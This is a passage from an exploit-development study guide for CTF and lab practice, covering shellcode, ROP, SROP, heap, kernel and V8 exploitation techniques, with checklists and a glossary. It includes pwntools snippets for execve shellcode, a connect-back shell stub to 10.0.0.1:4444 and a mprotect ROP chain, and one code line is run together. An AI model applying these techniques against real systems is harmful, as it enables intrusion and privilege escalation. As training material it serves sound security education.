for c in out/default/crashes/id*; do ./chall < "$c"; echo "$? <- $c"; done
# minimize & root-cause with ASAN build for precise diagnostics:
gcc -fsanitize=address -g chall.c -o chall_asan && ./chall_asan < crashfile
```

**Sanitizers are your friend:** an **ASan** build turns a vague heap corruption into an exact "heap-buffer-overflow WRITE of size N at ..." with a stack trace — invaluable for understanding *which* object and *what* offset before you weaponize.

---

## 25. Shellcode & pwntools shellcraft

**When you need raw shellcode** (executable stack, `mprotect`-ed region, JIT spray, or a `read` into RWX): use pwntools' `shellcraft` rather than hand-writing bytes.

```python
context.arch = 'amd64'
sc = shellcraft.sh()                 # /bin/sh execve stub
sc = shellcraft.cat('/home/user/flag')   # print a file
sc = shellcraft.connect('10.0.0.1',4444) + shellcraft.dupsh()  # reverse-ish stub
buf = asm(sc)                        # assemble to bytes
print(len(buf))
```

**Constraints to respect (why shellcode often needs care):**

- **Bad bytes:** if the input path strips `\x00`/`\x0a`/`\x20`, use an encoder or a null-free variant (`shellcraft` has null-free stubs; or XOR-decode a stub).
- **Space:** tiny buffers → a two-stage `read` stub that pulls a bigger stage into an RWX area.
- **NX:** you can only run shellcode where memory is executable — hence ROP-to-`mprotect` first (make the buffer RWX), *then* jump to your shellcode:
  ```python
  rop = ROP(exe)rop.mprotect(buf_page, 0x1000, 7)   # PROT_READ|WRITE|EXECrop.raw(buf_page)                    # jump into shellcode staged there
  ```
- **ARM/AArch64:** set `context.arch='aarch64'`; `shellcraft` emits ARM stubs; mind cache-flush semantics on some targets.

---

## 26. Advanced ROP — ret2csu, SROP, GOT/unlink

**ret2csu:** when you lack `pop rdx`/`pop rsi` gadgets, the compiler-inserted `__libc_csu_init` contains a gadget cluster that pops `rbx rbp r12 r13 r14 r15` and later moves `r13→rdx`, `r14→rsi`, `r15→rdi` before a call. It lets you control the 2nd/3rd args (`rsi`/`rdx`) for a call — the classic way to satisfy `write(fd,buf,len)` or `execve` arg setup on stripped-down binaries.

```python
rop = ROP(exe)
rop.call('__libc_csu_init', ...)   # pwntools can auto-build csu chains via rop.call with 3 args
rop.write(1, exe.got['write'], 8)  # example: leak with rsi/rdx controlled
```

**SROP (SigReturn-Oriented Programming):** a `sigreturn` syscall restores *all* registers + `rip` from a `sigcontext` frame on the stack. If you can call `sigreturn` (syscall 15) and control the stack, you set **every** register at once — powerful when gadgets are scarce (e.g., only a `syscall; ret` and a way to set `rax`):

```python
frame = SigreturnFrame()
frame.rax = 59                      # execve
frame.rdi = binsh_addr
frame.rsi = 0; frame.rdx = 0
frame.rip = syscall_gadget
payload = flat({offset: [pop_rax, 15, syscall_gadget, bytes(frame)]})
```

**GOT overwrite (partial RELRO):** redirect a still-writable GOT entry (e.g., `printf@got → system`) so a later call to that function runs your target instead — a leak-free finisher when the same function is called with attacker-controlled args. **Safe unlinking /**`unlink`**attack (older glibc / large bins):** forging `fd`/`bk` of a doubly-linked free chunk so `unlink` writes a pointer to a chosen location — modern glibc adds `fd->bk == P && bk->fd == P` corruption checks, so you must satisfy them (point `fd`/`bk` at a fake chunk near a writable pointer, the classic `&ptr-0x18`/`&ptr-0x10` trick).

---

## 27. Advanced Primitives Across Targets

**More heap techniques (recognize them):**

- **Poison-null-byte / off-by-one:** a single null overflow shrinks a size field, enabling chunk **overlap** via consolidation — leads to controlled overlapping allocations.
- **Large-bin attack:** insert a crafted chunk into a large bin to get a **single arbitrary write** of a heap/libc pointer to a chosen address (used to set up `_IO_list_all`/global targets for FSOP).
- **Tcache stashing / count corruption:** manipulate tcache counts to pull chunks from smallbins into an attacker-visible path.
- `__malloc_assert`**/ stdout leak tricks:** force an assert or partial `stdout` overwrite to leak libc when no clean leak exists.

**More kernel primitives (concepts):**

- **Race windows via**`userfaultfd`**/ FUSE:** register a userfault region (or a FUSE-backed file) so a kernel `copy_from_user`/`copy_to_user` **stalls** on your page, widening a TOCTOU/UAF race to near-100% reliability. Many hardened kernels restrict unprivileged `userfaultfd`, pushing toward FUSE.
- `keyring`**/**`msg_msg`**spray:** allocate controlled-size kernel objects to groom slabs and to leak (`msg_msg` for arbitrary-size reads).
- `pipe_buffer`**→ control flow;**`page_table`**overwrite → arbitrary R/W** (via page UAF/cross-cache, §19).
- **Dirty Pipe / Dirty COW class (concept):** logic/CoW bugs that yield file overwrite → root without classic memory corruption — worth recognizing as a category.

**More V8 bug classes (categories to study):**

- **OOB in**`TypedArray`**/**`Array` from a JIT bounds-check-elimination bug → direct read/write within the cage.
- **Type confusion via**`Map`**transitions / element-kind mismatches** → `addrOf`/`fakeobj`.
- `ArrayBuffer`**detach / length confusion** → aliased backing store.
- **WebAssembly (historically RWX)** as a route to executable memory before JIT hardening; now constrained.
- **The escape surface:** external-pointer objects and APIs whose storage sits outside the sandbox (§22) — the modern finish line.

---

## 28. Debugging, Pitfalls & Reliability

- **Local works, remote fails** → almost always a **wrong libc**. Match the exact libc/loader (`pwninit`, `patchelf --set-interpreter`), or leak & compute offsets purely at runtime.
- **Crash inside**`system`**/**`printf`**in libc** → **stack misalignment**; add a lone `ret` gadget before the libc call (`movaps` needs 16-byte alignment).
- **Leak is short / has null bytes** → `puts` stops at a null; use `write`/`%s` for exact lengths, and `u64(leak.ljust(8,b'\x00'))`.
- **tcache poisoning "no-op" on new glibc** → **safe-linking**: you need a heap-base leak to mangle `fd` as `(target ^ (chunk_addr>>12))`; also respect the alignment check on the returned pointer.
- **one\_gadget doesn't pop a shell** → its **constraints** weren't met; try another candidate or set up registers first.
- **Format string prints forever** → you asked `%n` to print billions; use `%hn`/`%hhn` staged writes.
- **Off-by-one / null-byte overflow (poison null byte)** → shrink/consolidate chunks; a classic heap trick worth recognizing.
- **Forking server + canary** → the canary is stable across forks; **brute per byte** (256 tries max each).
- **ASLR noise while debugging** → temporarily disable with `setarch -R` locally, but never *rely* on it — your final exploit must handle full ASLR via the leak.

---

## 29. Study Path & Practice Targets

A sane progression (all intentionally-vulnerable teaching material):

1. **Fundamentals & tooling:** pwn.college (Computer Systems Security), the pwntools docs.
2. **Stack & ROP:** ROP Emporium (ret2win → ret2libc → ret2csu → pivot), then CTF "pwn" easy set.
3. **Format strings & GOT:** small CTF challenges; practice both leak and write.
4. **Heap:** **how2heap** (read + run each technique per glibc version), then heap CTF challenges; learn the glibc source paths (`_int_malloc`, `_int_free`, `tcache_get/put`).
5. **glibc ACE:** FSOP / House-of-Apple write-ups; build one from an arbitrary write.
6. **ARM:** cross-compile + qemu-user; port a stack ROP to AArch64; read up on PAC/MTE.
7. **Kernel:** a kernel-pwn intro series + kernelCTF-style challenges; learn `modprobe_path`, the "useful objects," and return-to-user.
8. **Browser/V8:** saelo's "Attacking JavaScript Engines" and modern V8 sandbox write-ups; reproduce a documented teaching bug in a pinned `d8`. **Method for every technique:** read the concept → run the reference exploit against the practice binary in your VM → then rebuild it from scratch without looking. Understanding beats memorization on the exam.

---

## 30. Workflow Checklists, Tooling & Glossary

**Userland checklist:** `file`+`checksec` → find the bug → **leak** (defeat ASLR) → build primitive (ROP / tcache poisoning / fmt write) → **finish** (`system`/one\_gadget/FSOP) → stabilize (alignment, retries) → port local→remote (match libc).

**Kernel checklist:** find the vulnerable module + ioctl path → **leak** a kernel ptr (defeat KASLR) → get kernel R/W or control flow → **privesc** (`modprobe_path` / cred overwrite / `commit_creds(prepare_kernel_cred(0))`) → **return-to-user** → root shell.

**Browser checklist:** trigger the JS bug → OOB / type confusion → `addrOf`/`fakeobj` → arbitrary R/W → (RCE or) **sandbox escape**.

**Core tooling:**

```text
Recon/debug : file, checksec, rabin2, gdb + pwndbg/GEF, strace/ltrace, readelf/nm, ropper/ROPgadget, one_gadget, pwninit/patchelf
Build/drive : pwntools (ELF, ROP, fmtstr, shellcraft, SigreturnFrame, Ret2dlresolvePayload)
Emulate     : qemu-user (ARM), qemu-system (kernel), gdb-multiarch
Heap study  : how2heap, pwndbg heap/bins/arena
Browser     : d8 (V8), --allow-natives-syntax, %DebugPrint
```

**Glossary:**

- **NX/DEP · ASLR · PIE · canary · RELRO · FORTIFY · CET** — memory-corruption mitigations (§4).
- **ROP / gadget · ret2libc · ret2syscall · SROP · stack pivot** — code-reuse techniques (§6).
- **ret2dlresolve** — resolve+call a function via the dynamic linker with no leak (§7).
- **one\_gadget** — a single libc address that spawns a shell if constraints hold.
- **tcache / fastbin / unsorted bin · safe-linking** — glibc free-lists & the fd-mangling defense (§11).
- **UAF · double free · tcache poisoning · House-of-X** — heap primitives (§12).
- **FSOP / House of Apple** — forged `_IO_FILE` vtable → modern ACE finisher (§9).
- **PAC · BTI · MTE** — AArch64 pointer-auth / branch-target / memory-tagging mitigations (§15).
- **KASLR · SMEP · SMAP · KPTI · kCFI · STACKPROTECTOR** — kernel mitigations (§17).
- **commit\_creds · prepare\_kernel\_cred · modprobe\_path · return-to-user · cross-cache** — kernel privesc primitives (§17–19).
- **Map / hidden class · element kinds · pointer compression / cage** — V8 internals (§20).
- **addrOf · fakeobj · JIT type confusion · heap sandbox** — browser-exploitation primitives (§21–22).

---

*End of guide. This is a conceptual/methodology study reference for the LEE syllabus — build and practice everything against CTF binaries and lab VMs you own. It maps techniques and tools the way the public HackTricks / how2heap / CTF corpus teaches them; for full working code per technique, follow those step-by-step labs in your own sandbox.*
